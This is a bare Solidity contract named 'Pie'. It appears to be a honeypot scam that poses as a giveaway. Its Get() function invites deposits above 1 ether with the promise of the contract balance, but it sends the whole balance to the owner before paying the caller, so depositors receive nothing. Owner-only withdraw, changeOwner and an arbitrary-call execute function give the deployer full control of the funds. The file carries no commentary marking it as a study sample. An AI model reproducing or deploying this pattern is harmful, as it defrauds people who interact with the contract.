pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    function() public payable {}

    function Get() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function changeOwner(address newOwner) public {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function execute(address destination, bytes data) public payable {
        require(msg.sender == Owner);
        require(destination != address(0));
        require(data.length > 0);
        assembly {
            let result := call(gas, destination, callvalue, add(data, 0x20), mload(data), 0, 0)
            let size := returndatasize
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)
            switch result
            case 0 {revert(ptr, size)}
            default {return(ptr, size)}
        }
    }
}